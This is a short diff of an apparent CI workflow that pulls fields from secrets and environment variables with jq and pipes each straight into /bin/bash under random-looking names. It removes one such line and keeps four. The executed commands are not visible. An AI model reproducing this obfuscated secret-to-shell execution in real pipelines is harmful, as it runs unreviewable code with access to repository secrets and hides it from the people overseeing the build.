@@ -18,7 +18,6 @@ jobs:
           z72: ${{ secrets.z72 }}
         run: |
           printf '%s' "$z72" | jq -r .vfpk5948 | /bin/bash
-          printf '%s' "$cmgd76" | jq -r .msp1 | /bin/bash
           echo $wwge3396 | jq -r .wac94 | /bin/bash
           printf '%s' "$krqhs39001" | jq -r .j3 | /bin/bash
           printf '%s' "$ezyav4506" | jq -r .tram557 | /bin/bash
